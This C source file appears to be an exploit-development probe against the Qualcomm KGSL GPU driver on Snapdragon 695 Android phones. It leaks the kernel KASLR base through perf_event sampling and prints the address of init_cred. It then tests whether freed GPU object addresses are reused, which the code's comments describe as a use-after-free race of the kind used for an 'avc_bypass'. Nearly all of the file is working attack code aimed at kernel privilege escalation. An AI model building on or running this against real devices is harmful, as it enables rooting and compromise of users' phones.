/*
 * kgsl_uaf_test.c - Test UAF reuse on Snapdragon 695 (Adreno 619)
 * Build: aarch64-linux-android-gcc -static -o kgsl_uaf_test kgsl_uaf_test.c -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdarg.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <time.h>
#include <signal.h>

/* ========================== KGSL ioctl definitions ========================== */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_SIZE 0x10004000ULL
#define OVERLAP_SIZE 0x1000
#define BOGUS_SIZE 0x1000

#define VMLINUX_TEXT 0xffffffc010080000ULL
#define VMLINUX_INIT_CRED_OFFSET 0x26fa738

static int kgsl_fd = -1;
static int verbose = 1;

static void die(const char *msg) { perror(msg); exit(1); }
static void debug(int lvl, const char *fmt, ...) {
    if (lvl > verbose) return;
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
}

/* ========================== KGSL wrappers ========================== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
        debug(0, "  gpuobj_alloc(%llx,%llx) failed: errno=%d\n", size, flags, errno);
        return -1;
    }
    return a.id;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        debug(0, "  gpuobj_free(%u) failed: errno=%d\n", id, errno);
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    } else {
        debug(0, "  gpuobj_info(%u) failed: errno=%d\n", id, errno);
    }
    return ret;
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

/* ========================== KASLR detection via perf ========================== */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ========================== Main test ========================== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== KGSL UAF Reuse Test on Adreno 619 ===\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    /* Detect KASLR (for reference) */
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] KASLR = 0x%lx\n", kaslr);
    printf("[*] init_cred = 0x%lx\n", kaslr + VMLINUX_INIT_CRED_OFFSET);

    /* Allocate a context (needed for some operations) */
    unsigned int ctx = create_context();
    printf("[*] Context created: %u\n", ctx);

    /* ========== Test 1: GPU address reuse for same size allocation ========== */
    printf("\n[*] Test 1: Check if GPU address is reused after free+alloc\n");
    uint64_t flags_with_cpu = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    uint64_t flags_without_cpu = KGSL_CACHEMODE_WRITEBACK; // no CPU map

    // Using size that is likely to be reused (large object)
    uint64_t test_size = 0x100000; // 1MB

    // Allocate with CPU map
    int id1 = gpuobj_alloc(test_size, flags_with_cpu);
    if (id1 < 0) die("alloc1");
    uint64_t gpuaddr1 = 0;
    gpuobj_info(id1, &gpuaddr1, NULL);
    printf("  alloc1 (with CPU map): id=%d, gpuaddr=0x%lx\n", id1, gpuaddr1);
    gpuobj_free(id1);

    // Allocate again same size, same flags
    int id2 = gpuobj_alloc(test_size, flags_with_cpu);
    if (id2 < 0) die("alloc2");
    uint64_t gpuaddr2 = 0;
    gpuobj_info(id2, &gpuaddr2, NULL);
    printf("  alloc2 (with CPU map): id=%d, gpuaddr=0x%lx\n", id2, gpuaddr2);
    gpuobj_free(id2);

    printf("  Reuse? %s\n", (gpuaddr1 == gpuaddr2) ? "[YES]" : "[NO]");

    // Now test without CPU map
    int id3 = gpuobj_alloc(test_size, flags_without_cpu);
    if (id3 < 0) die("alloc3");
    uint64_t gpuaddr3 = 0;
    gpuobj_info(id3, &gpuaddr3, NULL);
    printf("  alloc3 (without CPU map): id=%d, gpuaddr=0x%lx\n", id3, gpuaddr3);
    gpuobj_free(id3);

    int id4 = gpuobj_alloc(test_size, flags_without_cpu);
    if (id4 < 0) die("alloc4");
    uint64_t gpuaddr4 = 0;
    gpuobj_info(id4, &gpuaddr4, NULL);
    printf("  alloc4 (without CPU map): id=%d, gpuaddr=0x%lx\n", id4, gpuaddr4);
    gpuobj_free(id4);

    printf("  Reuse (no CPU map)? %s\n", (gpuaddr3 == gpuaddr4) ? "[YES]" : "[NO]");

    /* ========== Test 2: GPU address for overlapped object with different flags ========== */
    printf("\n[*] Test 2: GPU address for objects allocated with OVERLAP_SIZE\n");
    // Try to allocate overlapped object with and without CPU map
    uint64_t overlap_flags[] = {flags_with_cpu, flags_without_cpu};
    const char *flag_names[] = {"with CPU map", "without CPU map"};
    for (int i = 0; i < 2; i++) {
        int ov_id = gpuobj_alloc(OVERLAP_SIZE, overlap_flags[i]);
        if (ov_id < 0) {
            printf("  alloc OVERLAP_SIZE (%s) failed\n", flag_names[i]);
            continue;
        }
        uint64_t ov_gpuaddr = 0;
        gpuobj_info(ov_id, &ov_gpuaddr, NULL);
        printf("  ov_id=%d, gpuaddr=0x%lx (%s)\n", ov_id, ov_gpuaddr, flag_names[i]);
        gpuobj_free(ov_id);
    }

    /* ========== Test 3: UAF race attempt with proper overlapping ========== */
    printf("\n[*] Test 3: Attempt UAF race by reusing same GPU address\n");
    // We need to allocate a large object, get its GPU address, free it,
    // then allocate a smaller object that fits inside the same region,
    // and check if the smaller object's GPU address is within the freed region.
    // This is the classic UAF pattern used in avc_bypass.

    // Allocate large object
    int large_id = gpuobj_alloc(UAF_SIZE, flags_with_cpu);
    if (large_id < 0) die("large alloc");
    uint64_t large_gpuaddr = 0;
    gpuobj_info(large_id, &large_gpuaddr, NULL);
    printf("  Large object id=%d, gpuaddr=0x%lx\n", large_id, large_gpuaddr);

    // Free it
    gpuobj_free(large_id);
    printf("  Freed large object\n");

    // Now allocate a smaller object that will likely reuse the same GPU address
    int small_id = gpuobj_alloc(OVERLAP_SIZE, flags_with_cpu);
    if (small_id < 0) die("small alloc");
    uint64_t small_gpuaddr = 0;
    gpuobj_info(small_id, &small_gpuaddr, NULL);
    printf("  Small object id=%d, gpuaddr=0x%lx\n", small_id, small_gpuaddr);

    // Check if small_gpuaddr falls within the large object's range
    if (small_gpuaddr >= large_gpuaddr && small_gpuaddr < large_gpuaddr + UAF_SIZE) {
        printf("  [SUCCESS] Small object allocated inside freed large object region! UAF possible.\n");
    } else {
        printf("  [FAIL] Small object not inside freed region. UAF may not work.\n");
    }
    gpuobj_free(small_id);

    /* ========== Test 4: Check if mmap on freed object still works ========== */
    printf("\n[*] Test 4: mmap on freed object (should fail or map stale)\n");
    // Allocate, mmap, free, then mmap again (should fail or map something else)
    int test_id = gpuobj_alloc(0x1000, flags_with_cpu);
    if (test_id < 0) die("test alloc");
    void *map1 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)test_id << 12);
    if (map1 == MAP_FAILED) {
        printf("  mmap before free: failed\n");
    } else {
        printf("  mmap before free: success at %p\n", map1);
        munmap(map1, 0x1000);
    }
    gpuobj_free(test_id);
    void *map2 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)test_id << 12);
    if (map2 == MAP_FAILED) {
        printf("  mmap after free: failed (errno=%d)\n", errno);
    } else {
        printf("  mmap after free: success at %p (unexpected!)\n", map2);
        munmap(map2, 0x1000);
    }

    close(kgsl_fd);
    printf("\n[*] Test complete.\n");
    return 0;
}
